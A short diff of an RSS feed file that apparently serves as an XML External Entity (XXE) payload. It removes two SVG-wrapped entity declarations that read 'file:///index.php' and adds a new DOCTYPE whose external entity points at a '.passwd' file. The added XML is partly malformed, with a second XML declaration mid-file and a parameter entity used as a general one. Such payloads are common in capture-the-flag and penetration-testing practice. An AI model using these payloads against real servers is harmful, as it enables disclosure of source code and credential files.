@@ -5,18 +5,12 @@
   <title>&xxe;</title>
   <link>https://www.w3schools.com</link>
   <description>Free web building tutorials</description>
-  <item>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///index.php" > ]>
-<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
-   <text font-size="16" x="0" y="16">&xxe;</text>
-</svg>
-  </item>
-    <item>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file://index.php" > ]>
-<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
-   <text font-size="16" x="0" y="16">&xxe;</text>
-</svg>
-  </item>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM ".passwd" >
+]>
+<foo>&xxe;</foo>
 </channel>
 
 </rss>
